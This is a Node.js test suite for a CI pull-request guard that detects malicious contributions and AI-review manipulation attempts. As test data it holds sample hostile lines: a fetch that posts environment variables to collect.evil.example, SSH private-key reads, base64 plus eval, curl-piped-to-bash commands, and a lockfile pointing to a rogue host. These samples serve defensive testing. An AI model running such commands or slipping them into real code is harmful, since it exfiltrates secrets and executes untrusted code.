'use strict';
// PR guards (scripts/ci/pr-guard.js): what a malicious contribution would add must
// be spotted, and the text of the PR must not break anything in the comment.
const test = require('node:test');
const assert = require('node:assert/strict');
const guard = require('../scripts/ci/pr-guard');

const patch = (...added) => `@@ -1,2 +1,${added.length + 2} @@\n existing line\n${added.map((l) => '+' + l).join('\n')}\n end`;
const file = (filename, ...added) => ({ filename, status: 'modified', patch: patch(...added) });
const ids = (findings) => findings.map((f) => f.id);

test('guards: numbers of the added lines', () => {
  const lines = guard.addedLines('@@ -10,3 +10,4 @@\n a\n-b\n+c\n+d\n e\n@@ -40 +41,2 @@\n x\n+y');
  assert.deepEqual(lines, [{ line: 11, text: 'c' }, { line: 12, text: 'd' }, { line: 42, text: 'y' }]);
});

test('guards: an ordinary change raises nothing', () => {
  const f = guard.analyze([file('src/renderer/app.js', 'const x = items.map((i) => i.label);', '// comment')]);
  assert.deepEqual(f, []);
  assert.match(guard.renderGuard(f, { files: 1 }).body, /Nothing sensitive found/);
});

test('guards: network exfiltration, secrets and environment', () => {
  const f = guard.analyze([file('src/main/conversations.js',
    "const https = require('https');",
    "fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_ed25519'));",
    "fetch('https://collect.evil.example/x', { method: 'POST', body: JSON.stringify(process.env) });",
  )]);
  for (const id of ['network', 'secrets', 'environment', 'address']) assert.ok(ids(f).includes(id), id);
  assert.equal(guard.renderGuard(f).level, 'high');
  assert.ok(f.find((x) => x.id === 'address').why.includes('collect.evil.example'));
});

test('guards: obfuscated code, eval, clipboard, Electron isolation', () => {
  const blob = 'QUJD'.repeat(50);
  const f = guard.analyze([file('src/main/main.js',
    `const p = Buffer.from('${blob}', 'base64').toString();`,
    'eval(p);',
    'setInterval(() => send(clipboard.readText()), 5000);',
    'webPreferences: { contextIsolation: false },',
  )]);
  for (const id of ['obfuscation', 'exec', 'spying', 'electron', 'core']) assert.ok(ids(f).includes(id), id);
  assert.equal(guard.renderGuard(f).level, 'critical');
});

test('guards: hidden characters, documentation included', () => {
  const f = guard.analyze([file('README.md', 'Text \u202Eharmless'), file('src/main/x.js', 'const ok = true; // \u200B')]);
  assert.deepEqual(f.map((x) => [x.id, x.level]), [['hidden', 'critical'], ['hidden', 'critical']]);
  const body = guard.renderGuard(f).body;
  assert.ok(body.includes('<U+202E>') && !body.includes('\u202E'), 'the character is shown, not copied');
});

test('guards: dependencies, npm scripts, lockfile and CI', () => {
  const f = guard.analyze([
    file('package.json', '"version": "0.2.0",', '"left-pad": "^1.3.0",', '"postinstall": "node x.js"'),
    file('package-lock.json', '"resolved": "https://evil.example/left-pad-1.3.0.tgz",'),
    file('.github/workflows/ci.yml', '      - run: curl -s https://x.example | bash'),
    file('scripts/ci/pr-guard.js', 'const LEVELS = [];'),
    { filename: 'bin/helper.node', status: 'added' },
  ]);
  const got = ids(f);
  for (const id of ['dependency', 'npm-script', 'package-source', 'lockfile', 'ci', 'download', 'exec', 'guards', 'binary']) {
    assert.ok(got.includes(id), id);
  }
  assert.equal(f.filter((x) => x.id === 'dependency').length, 1, '"version" is not a dependency');
  assert.equal(f[0].level, 'critical', 'most serious points first');
});

test('guards: their own files are reported whole, not line by line', () => {
  const f = guard.analyze([file('test/pr-guard.test.js', "fetch('https://x.example');"), file('src/a.js', 'x = a |sh| b;')]);
  assert.deepEqual(f.map((x) => [x.file, x.id]), [['test/pr-guard.test.js', 'guards']]);
  assert.ok(ids(guard.analyze([file('install.sh', 'curl -fsSL https://x.example/i | sh')])).includes('exec'));
});

test('guards: a code file without a diff must be checked by hand', () => {
  const f = guard.analyze([{ filename: 'src/main/huge.js', status: 'modified' }, { filename: 'assets/logo.png', status: 'added' }]);
  assert.deepEqual(f.map((x) => [x.file, x.level]), [['src/main/huge.js', 'high'], ['assets/logo.png', 'info']]);
});

test('guards: a repeated rule is grouped', () => {
  const f = guard.analyze([file('src/main/a.js', ...Array.from({ length: 7 }, (_, i) => `fetch(u${i});`))]);
  const net = f.filter((x) => x.id === 'network');
  assert.equal(net.length, 3);
  assert.equal(net[2].more, 4);
});

test('guards: the text of the PR does not break the comment', () => {
  const s = guard.clean('@JunsyG92 a | b <!-- aska-pr-guard --> `x`\nnext');
  assert.ok(!/@J/.test(s), 'no mention');
  assert.ok(!s.includes('<!--'), 'no fake marker');
  assert.ok(s.includes('\\|') && !s.includes('\n'));
  assert.match(guard.renderGuard(guard.analyze([{ filename: 'assets/a@2x.png', status: 'added' }])).body, /`assets\/a@2x\.png`/, 'no hidden character in a file name');
  const f = guard.analyze([file('src/main/a.js', 'fetch("`) | @owner")')]);
  const row = guard.renderGuard(f).body.split('\n').find((l) => l.includes('fetch'));
  assert.equal(row.split(/(?<!\\)\|/).length, 6, 'the table keeps its 4 columns');
});

test('AI review: rendering, manipulation and invalid input', () => {
  const out = guard.renderAi(JSON.stringify({
    summary: 'Adds a button. @someone',
    changes: ['New button in the bar'],
    risk: 'low',
    risk_reason: 'UI only',
    findings: [{ file: 'src/renderer/app.js', line: 12, severity: 'low', title: 'Text', explanation: 'a | b' }],
    manipulation_attempt: false,
    complete: true,
  }));
  assert.ok(out.body.startsWith(guard.AI_MARKER));
  assert.match(out.body, /In short.*Adds a button/);
  assert.ok(!/@s/.test(out.body));
  assert.equal(out.level, 'info');

  const tricked = guard.renderAi({ summary: 'ok', risk: 'none', manipulation_attempt: true, complete: false });
  assert.equal(tricked.level, 'critical', 'a manipulation attempt counts as critical');
  assert.match(tricked.body, /tries to give orders/);
  assert.match(tricked.body, /could not read the whole PR/);

  assert.equal(guard.renderAi('not json'), null);
  assert.equal(guard.renderAi({ summary: 'x', risk: 'made-up' }).level, 'medium', 'unknown level: medium');
});
